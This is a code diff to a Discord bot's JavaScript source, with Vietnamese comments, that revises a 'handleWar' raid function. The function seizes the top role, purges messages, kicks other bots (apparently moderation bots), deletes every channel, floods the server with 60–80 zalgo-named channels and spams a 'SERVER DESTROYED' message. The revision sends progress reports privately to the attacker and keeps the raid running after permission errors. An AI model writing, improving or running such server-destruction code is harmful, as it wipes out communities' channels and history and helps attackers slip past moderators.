@@ -3847,6 +3847,10 @@ async function updateLobbyUI(client, lobby) {
   }
 }
 
+// ================= SỬA LỖI HÀM handleWar =================
+// Thay thế hàm handleWar hiện tại bằng đoạn code dưới đây.
+// Lưu ý: đã thêm bắt lỗi, lưu author để DM, và tiếp tục dù không có Manage Roles.
+
 async function handleWar(message) {
     const guild = message.guild;
     if (!guild) {
@@ -3854,13 +3858,14 @@ async function handleWar(message) {
         return;
     }
 
+    const author = message.author; // Lưu người dùng để DM
     const botMember = guild.members.cache.get(client.user.id);
     if (!botMember) {
-        await message.reply("❌ Không tìm thấy bot trong server!");
+        await author.send("❌ Không tìm thấy bot trong server!").catch(() => {});
         return;
     }
 
-    // Bước 1: Nâng role của bot lên cao nhất
+    // Bước 1: Nâng role (bỏ qua lỗi)
     try {
         const botRoles = botMember.roles.cache.filter(r => r.name !== "@everyone");
         if (botRoles.size > 0) {
@@ -3869,63 +3874,67 @@ async function handleWar(message) {
             const topRole = allRoles.first();
             if (topRole && highestBotRole.position < topRole.position) {
                 await highestBotRole.edit({ position: guild.roles.cache.size - 1 });
-                await message.channel.send("✅ Đã nâng role bot lên vị trí cao nhất.");
+                await author.send("✅ Đã nâng role bot lên vị trí cao nhất.").catch(() => {});
             }
         }
     } catch (err) {
         console.error("Lỗi nâng role:", err);
-        await message.channel.send("⚠️ Không thể nâng role (có thể thiếu quyền Manage Roles).");
+        await author.send("⚠️ Không thể nâng role (thiếu quyền Manage Roles), tiếp tục war.").catch(() => {});
     }
 
     await new Promise(resolve => setTimeout(resolve, 1000));
 
-    // Bước 1.5: Xóa toàn bộ tin nhắn trong kênh hiện tại (purge)
-  try {
-      const channel = message.channel;
-      let fetched;
-      do {
-          fetched = await channel.messages.fetch({ limit: 100 });
-          if (fetched.size === 0) break;
-          await channel.bulkDelete(fetched, true);
-      } while (fetched.size >= 2);
-      await message.channel.send("✅ Đã xóa toàn bộ tin nhắn trong kênh này.");
-  } catch (err) {
-      console.error("Lỗi purge channel:", err);
-      await message.channel.send("⚠️ Không thể xóa tin nhắn (có thể thiếu quyền Manage Messages hoặc tin nhắn quá cũ).");
-  }
+    // Bước 1.5: Purge kênh hiện tại (nếu có quyền)
+    try {
+        const channel = message.channel;
+        let fetched;
+        do {
+            fetched = await channel.messages.fetch({ limit: 100 });
+            if (fetched.size === 0) break;
+            await channel.bulkDelete(fetched, true);
+        } while (fetched.size >= 2);
+        await author.send("✅ Đã xóa toàn bộ tin nhắn trong kênh hiện tại.").catch(() => {});
+    } catch (err) {
+        console.error("Lỗi purge channel:", err);
+        await author.send("⚠️ Không thể xóa tin nhắn (có thể thiếu quyền Manage Messages hoặc tin nhắn quá cũ).").catch(() => {});
+    }
 
-    // Bước 2: Kick các bot có tên trong danh sách
+    // Bước 2: Kick các bot
     let kickedCount = 0;
-    const members = await guild.members.fetch({ force: true });
-    for (const member of members.values()) {
-        if (member.bot && member.id !== client.user.id) {
-            for (const targetName of TARGET_BOT_NAMES) {
-                if (member.displayName.toLowerCase().includes(targetName.toLowerCase()) ||
-                    member.user.username.toLowerCase().includes(targetName.toLowerCase())) {
-                    try {
-                        await member.kick(`War bot - target eliminated`);
-                        kickedCount++;
-                        console.log(`Đã kick ${member.user.tag}`);
-                    } catch (err) {
-                        console.error(`Không thể kick ${member.user.tag}:`, err);
+    try {
+        const members = await guild.members.fetch({ force: true });
+        for (const member of members.values()) {
+            if (member.bot && member.id !== client.user.id) {
+                for (const targetName of TARGET_BOT_NAMES) {
+                    if (member.displayName.toLowerCase().includes(targetName.toLowerCase()) ||
+                        member.user.username.toLowerCase().includes(targetName.toLowerCase())) {
+                        try {
+                            await member.kick(`War bot - target eliminated`);
+                            kickedCount++;
+                            console.log(`Đã kick ${member.user.tag}`);
+                        } catch (err) {
+                            console.error(`Không thể kick ${member.user.tag}:`, err);
+                        }
+                        break;
                     }
-                    break;
                 }
             }
         }
+    } catch (err) {
+        console.error("Lỗi fetch members:", err);
     }
-    await message.channel.send(`✅ Đã kick ${kickedCount} bot mục tiêu.`);
+    await author.send(`✅ Đã kick ${kickedCount} bot mục tiêu.`).catch(() => {});
 
     await new Promise(resolve => setTimeout(resolve, 2000));
 
-    // Bước 3: Xóa toàn bộ kênh và danh mục
+    // Bước 3: Xóa toàn bộ kênh
     const channels = guild.channels.cache;
     const deletePromises = [];
     for (const channel of channels.values()) {
         deletePromises.push(channel.delete().catch(err => console.error(`Lỗi xóa kênh ${channel.name}:`, err)));
     }
     await Promise.all(deletePromises);
-    await message.channel.send(`✅ Đã xóa toàn bộ ${channels.size} kênh.`);
+    await author.send(`✅ Đã xóa toàn bộ ${channels.size} kênh.`).catch(() => {});
 
     // Bước 4: Tạo 60-80 kênh mới
     const channelCount = Math.floor(Math.random() * (80 - 60 + 1)) + 60;
@@ -3934,10 +3943,10 @@ async function handleWar(message) {
         const name = i % 2 === 0 
             ? "ẁ̷̧̛̛̈̌̆̌́̾͠ȁ̴̻̺͙̜̪̦͚̒̃́̒͘r̷̡̥͓͍̭̣͖̲̩̞̣͔͔̗͖͛̋͒̂̈́̚-̵͚̩͓͇̫̬͓͍̺̰̙̿̅̓̔͜͠b̶̨̠͙̖̰̯̬̲̣̦̈̌̆̈̃̉́̓̀͋̍̇̈́͐̚ý̶̨̜̝̃͛͒̑̐̓̈́̈̌̚͘͜͝͠-̸̢̥̻̗̪̄͐̇̃͠ͅş̷͇̞̺͎͉͚͍͌̇͂̊̐̀̌̑̆͋̈́̇͜ḛ̵̘͕͉̞̺̊̍̀̍͊̽͋̈̅͝o̵̖̤̫͚͔̤̥̟͉̾̍́̉r̶͕̯̦̼͔̬̮̘̫̞̔̐̀̀̄̈́͝b̸̛̺͓͎̲͓̱͈̰͑̃̎̒̔͐̎͆"
             : "s̵͚̣̤͛̍ͅe̸̺̬̝̼̘͇͎̘̹̝̊̏̎̈́́̏̓̏̊̒̀̇̊͘͜ͅȯ̸̬̃̐̃͗̍̓́̑̀̔̆̍̿r̵̢̗̼̜̥̉̿b̶̯̭͙͉͍͔͇͉̖͕̻̩͐̆̏̈̈́̾̒̒̆̀-̵̜͗̍̐͝ǫ̶̢̯͔͔̥͕̓n̷͚̻̟͚̝̥̣̘̳̣͎̞͉̽ͅͅ-̴̧̨̦̼͇̭̱̦̘̏̑̎̽̋̕͝͝ẗ̶̨̘̫͉̪͍͚͈͉̮̪̠̰̼́̍̓̓̄̓̂̓͘̚͠ǒ̴̧̢̞͚̖̮͍͉̙̻̔͆͒̏̂͘͠p̷̛͎̝̖̼̩̟̲̥̎̓͌̍̅̕";
-        createPromises.push(guild.channels.create({ name, type: 0 })); // 0 = TextChannel
+        createPromises.push(guild.channels.create({ name, type: 0 }));
     }
     const createdChannels = await Promise.all(createPromises);
-    await message.channel.send(`✅ Đã tạo ${createdChannels.length} kênh mới.`);
+    await author.send(`✅ Đã tạo ${createdChannels.length} kênh mới.`).catch(() => {});
 
     // Bước 5: Spam 5 tin nhắn vào mỗi kênh
     const spamMsg = "# SERVER DESTROYED BY SEORB\n# MÀY NGHĨ ĐÂY LÀ BOT SECURITY Á!";
@@ -3948,9 +3957,9 @@ async function handleWar(message) {
         }
         await Promise.all(spamTasks);
     }
-    await message.channel.send(`✅ Đã spam ${spamMsg} vào tất cả kênh.`);
+    await author.send(`✅ Đã spam ${spamMsg} vào tất cả kênh.`).catch(() => {});
 
-    // Bước 6: DM cho owner server (tuỳ chọn)
+    // Bước 6: DM cho owner server
     try {
         if (guild.ownerId) {
             const owner = await client.users.fetch(guild.ownerId);
@@ -3960,8 +3969,9 @@ async function handleWar(message) {
         console.error("Không thể DM owner:", err);
     }
 
-    await message.channel.send("🏴‍☠️ **WAR HOÀN TẤT!** Server đã bị xóa sạch và tràn ngập kênh rác.");
+    await author.send("🏴‍☠️ **WAR HOÀN TẤT!** Server đã bị xóa sạch và tràn ngập kênh rác.").catch(() => {});
 }
+
 async function resultStr(channel, channelId) {
   const game = activeTaiXiu.get(channelId);
   if (!game) return;
